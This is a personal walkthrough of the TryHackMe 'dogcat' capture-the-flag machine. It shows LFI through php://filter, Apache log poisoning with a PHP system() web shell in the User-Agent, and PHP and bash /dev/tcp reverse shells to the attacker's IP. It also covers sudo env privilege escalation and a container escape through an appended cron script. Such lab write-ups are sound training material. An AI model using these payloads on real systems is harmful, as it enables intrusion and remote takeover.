
Hi everyone, today I would like to analyze the machine called `dogcat` on TryHackMe platform. 

Let me add my ipv4 address to `/etc/hosts` file.

![[TryHackMe/Dogcat/images/1.png]]


## Reconnaissance

I prefer to divide `recon` phase into two sub category. I will respectively apply both manual & automated reconnaissance in advance.

- Manual 
- Automated

### Manual Reconnaissance:
Without using any tool, we can conduct a scan just by taking advantage of the browser. Furthermore, `curl` also suitable for diverse HTTP methods plus direct port queries.

![[TryHackMe/Dogcat/images/2.png]]
As you can see, you should always modify the `http://` part of the url in every time since every time browser redirects the client to the `https` protocol working on `443`.

![[TryHackMe/Dogcat/images/3.png]]

In order to verify both the web app instance and web server type, I will check for both web application instance and its type at once through the browser. In this scenario, `Apache` has been used to make live our application. To understand it, using `http` with port `8080` (default Apache port number) is compatible right now.

- By requesting through `curl`, we can reach the same result.

```
#Testing port 80
curl http://dogcat.thm:80

#Testing port 8080
curl http://dogcat.thm:8080
```

![[TryHackMe/Dogcat/images/4.png]]

Furthermore, you can also get `HTTP header` info through `-I` option.

```
curl -I http://dogcat.thm:80/8080
```

![[TryHackMe/Dogcat/images/5.png]]


Time reduction is crucial aspect for offensive security operations ,so before you move on conducting port scans via `nmap`. I highly recommend you to take action on manual part.

Let's check what we have:
![[TryHackMe/Dogcat/images/6.png]]

`Image generation` web application, without the usage of any `persistent storage (Database)`. After clicking any image, I recognized that we can temper end point parameter just by giving unusual parameter or trigger `LFI` or `RFI`. I intentionally tried to click `dog` button then try to move parent directory using `../`.

![[TryHackMe/Dogcat/images/7.png]]

Now let's execute it on browser's URL part:

![[TryHackMe/Dogcat/images/8.png]]

As you can see here, the behavior of the web app altered, normally it should not render upper directory by default. We just delete the `?view=` part and reach default page. 

Anyway, let me also use automated scan.

### Automating

Nmap provides significant evidence to our roadmap in every CTF session ,but in this scenario I assumed that I should directly get initial compromise on web app.

Payload:
```
sudo nmap -sV -sC dogcat.thm
```

![[TryHackMe/Dogcat/images/9.png]]


Payload:
```
sudo nmap -sV -sC -p- dogcat.thm
```
![[TryHackMe/Dogcat/images/10.png]]

Additionally, I wanted to intercept the `view` parameter ,so maybe I can trigger `path traversal` then move on `LFI`. Let me use a `HackTricks`

[HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

![[TryHackMe/Dogcat/images/12.png]]

As you can see below, there was not such file located on correlated path:

![[TryHackMe/Dogcat/images/11.png]]

I understood the occurrence of the `path traversal` since I was able to try to show specific path, `../../../../var/www/html/config.php` ,but the application behaved in a different manner. In contrast, it applied some additions on last part of the path's ending part.

![[TryHackMe/Dogcat/images/13.png]]

To get the idea behind the application (backend), I used really unique file name called `ErkanUcar`. As you can see above, it is clear that application intended to make file extension addition on any file. In this scenario it applied `.php`. Maybe there should also a method for escaping `.php` extension. From that idea, having a bright understanding about `LFI` is possible. Moreover, the error message genuinely explains whether we have `LFI` or not. In every attempt, it was executing file + `.php` extension. 

Thanks to `Medium` known as article publication platform, I easily found what I need especially escaping restrictions on `LFI`. 

![[TryHackMe/Dogcat/images/14.png]]

It suggests that If we apply `NullByte - %00` on last part where url was located, we can directly bypass restriction. On this concept, he or she did not use the advantage of null byte. 

Let me apply it:

Payload:

```
cat/../../../../etc/erkanucar%00
```


![[TryHackMe/Dogcat/images/15.png]]


In every attempt that I made restricted by web application because it was clear that using `whitelist` approach on words like `cat` or `dog` prevents users to inject `LFI` payload. We can still traverse ,but not execute something useful `php` file. Furthermore, web application technology is playing crucial role in such cases. Therefore, I checked the web application technology that is used by our instance using `wappalyzer` and `whatweb`.

### Whatweb Output:
![[TryHackMe/Dogcat/images/16.png]]

Payload:
`whatweb dogcat.thm`

### Wappalyzer Output:
![[TryHackMe/Dogcat/images/17.png]]

I deliberately gave two approach to fulfill the same result with `different tools`. Lastly, having a strong foundation on web application fuzzing is necessary in order to discovery phase. In my scenario, since I found `LFI` vulnerability directly. I would like to reach other endpoints of the web application to increase the efficiency of my `LFI`.

### Dirsearch Output:

Payload:

```
dirsearch -u http://dogcat.thm
```


![[TryHackMe/Dogcat/images/18.png]]


I only got `/flag.php` path seems to more weird. Why I need to name my `php` application as flag :)

### Dirb Output:

![[TryHackMe/Dogcat/images/19.png]]

After I make my fuzzing operation, I decided to move on `flag.php` path. However, it did not render something. Moreover, it was identical that I found another endpoint on `view?=dog` parameter resulted in `Burpsuite Repeater`

![[TryHackMe/Dogcat/images/20.png]]

Now, I will discover them manually. Still I could not reach any useful paths. Now, I prefer to use [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter) repo in order to understand what can I achieve on `PHP filters`.


![[TryHackMe/Dogcat/images/21.png]]
It was not too complicated to use `php://filter` ,but we should give the endpoint direction through our `resource=` part as a payload. Th
erefore, let me use filters in a legit way.

```
http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog
```


![[TryHackMe/Dogcat/images/22.png]]

From my point of view, the application encodes the dog.php via `Base64` then prompts out the file content. Now it works !

I also wanted to decode it with `cyberchef tool` to understand what exactly it does.

```
PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
```

![[TryHackMe/Dogcat/images/23.png]]

First of all, `PHP` code generated numbers from `1 to 10` then it concatenates generated number with `.jpg` extension. As you know, we are in the path where it is in the child directory of root. Let's move on `index` part.

![[TryHackMe/Dogcat/images/24.png]]


Extracting `index` file will be magnificent to understand the entire structure of our web application especially for the backend part.

`base64` encoded server-side file is such:
`dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog/../index`

After you reach the page you will encounter a huge formatted random string:
![[TryHackMe/Dogcat/images/25.png]]

You can directly extract from browser's rendered html section. This was what I have extracted so far !

![[TryHackMe/Dogcat/images/26.png]]

As a software developer, I thought that  what actions should I take on the backend code on `server-side`.

Using variable without conditional statements or sanitization mainly causes vulnerability especially in `php`. That's why, I can tamper the `$ext` variable so as to modify file extension of the file. I have already verified the usage of `php://filter` feature then it worked !

Now let me also use variable as a parameter on this scenario:

```
http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&ext
```
Applying `php://filter` bypasses `cat` , `dog` string and path direction filters ,but not the extension itself. Moreover, `null byte` also did not work as you know because of the path restrictions. Therefore, it is suitable to use `$ext` to bypass extension append. To pass multiple parameters in each URL, we should use `&` parameter. Now let's try to move our target route called `/etc/passwd`.

![[TryHackMe/Dogcat/images/27.png]]

![[TryHackMe/Dogcat/images/28.png]]

Now we are ready to reach flag ! ! !
As far as I remember, we have also `SSH` port open. That's why, I will try to use unshadow through `/etc/passwd` and `/etc/shadow`. Although I successfully reached the `/etc/passwd` file, there was not any `/etc/shadow` file located on that path ,so let me try to open `flag.php` with `php filter base64` conversion.

```
http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog/../flag&ext=.php
```

Passing extensions through the `$ext` variable may give the result for all files.

![[TryHackMe/Dogcat/images/29.png]]

`View Page Source` option allows us to directly the encoded source file. 
![[TryHackMe/Dogcat/images/30.png]]

Finding any clues about `flag2` was significantly tough process for me. However, further *reconnaissance* always works in `Offensive Security`. As you know, I have already checked web server version (Apache 2) that we are using. Let's verify the path the default logs stored on web server.

![[TryHackMe/Dogcat/images/31.png]]

Let me try also the `/var/log/apache2/access.log` file to achieve further enumeration.

![[TryHackMe/Dogcat/images/32.png]]

Decoded format:
![[TryHackMe/Dogcat/images/33.png]]

The application directly gets our user agent as above. After a couple of minutes, I thought that in HackTheBox platform I saw an approach a machine called `Headless` which was very useful especially to execute commands through on User Agent part.

![[TryHackMe/Dogcat/images/34.png]]

This is what front-end renders at the same time:
![[35.png]]

Burpsuite gave me better result. Let me try to user-agent manipulation because  if we can somehow execute php's `system();` command it will also execute on main php file. After I execute such a command:

```
<?php system("ls")?>
```

I was no longer access `access.log` file because of the default `Apache2` configuration. Using web shell can be suitable for our condition `&cmd='ls' or ?cmd='ls'`. I thought this idea from a [Reddit post](https://www.reddit.com/r/AskNetsec/comments/8ckbc7/executing_a_php_script_a_reverse_shell_by_calling/)
describing our situation.

![[36.png]]

Before I began, adding our php command on User-Agent would be suitable. Let's try all our sources:

Now I verified that I could run command remotely by using such payload:

```
User-Agent: <?php system('ls'); ?>
```

### Note: Do not forget to finish your method with ; in every php function.

![[38.png]]

Furthermore, user-agent did not work more than once. Switch on `GET` method to get reverse shell.

```
system(GET['cmd']);
```

To retrieve cmd on PHP just passing `&cmd` is enough to get `$cmd` parameter from url because we are gonna apply also URL encoding to make our payload working. In my first attempt, `User-Agent` was blocked by application in second time. Now `URL encoding` was useful in that concept. `cmd` parameter also dynamically stores the payload value which is `whoami` command to guarantee PoC:

Payload (Encoded):
```
// Retrieve cmd variable by using GET super-global array then gets value from url.
<?php system($_GET['cmd']); ?>

// Give whatever you want like erkanucar, serkangenc, cuneytsevgi and so on

// Encoded Format:
%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
```

![[40.png]]

### PoC for user:

![[41.png]]

Let's embed our reverse shell:

```
php -r '$sock=fsockopen("10.11.69.113", 1984);exec("/bin/bash -i <&3 >&3 2>&3");'

// encoded:
php%20-r%20%27%24sock%3Dfsockopen%28%2210.11.69.113%22%2C%201984%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

After tampering couple of times on encoding parts especially for reverse shell payload. I recognized that you just need to encode `reverse shell payload`. Finally, I got my `reverse shell`:

![[42.png]]

### Flag2: (/var/www/)

![[43.png]]

You can easily reach out the second `flag` from here.

### Flag3: (Privilege Escalation - Binary Exploitation (env))

![[44.png]]

By default I applied [GFTObins](https://gtfobins.github.io/gtfobins/env/) mentality then check for `binaries` that I can run. Prompt told me that you are ready to run `env` binary with `sudo` privilege. That's all !

Payload that you need to use in below:

```
sudo env /bin/sh
```

![[45.png]]

Now as a result, we really **Get The Fuck Out The Binary** :)

![[46.png]]

Last flag located on `root` directory:

![[47.png]]



### Flag4 (linpeas.sh & Container Escape)

I deployed a python server using below command:

```
python3 -m http.server 3131
```

After that I checked whether I have `curl` or not:

```
which curl
```

Lastly, download `linpeas.sh` from your local:

```
curl -O http://10.11.69.113:3131/linpeas.sh
```

Give execution permission:

```
chmod +x linpeas.sh
```

Fire !

```
./linpeas.sh
```

![[48.png]]

Thx Carlos :)

I recognized that I was in `Docker Container` and there was just only one way to get rid of container which is `VM escape`.

![[49.png]]

![[50.png]]
I was able to apply `release_agent 1` ,but I never tried instead I found different and weird path with `.sh` script.

![[51.png]]

Let me move on here:

![[52.png]]

Unfortunately, I did not have any text editor (`nano` or `vim`)

![[53.png]]

We should get rid of the VM. In this step we have only one way to `escape` through the `root` of the container. Get your `bash` [reverse shell](https://tex2e.github.io/reverse-shell-generator/index.html) :

```
echo "bash -i >& /dev/tcp/10.11.69.113/2323 0>&1" >> backup.sh
```


It was too weird ,but in my initial execution of `backup.sh` was successful. However, I got a shell which was not like a escaped root shell.

![[54.png]]

It worked in my second attempt then gave me another shell, real root user :D

![[55.png]]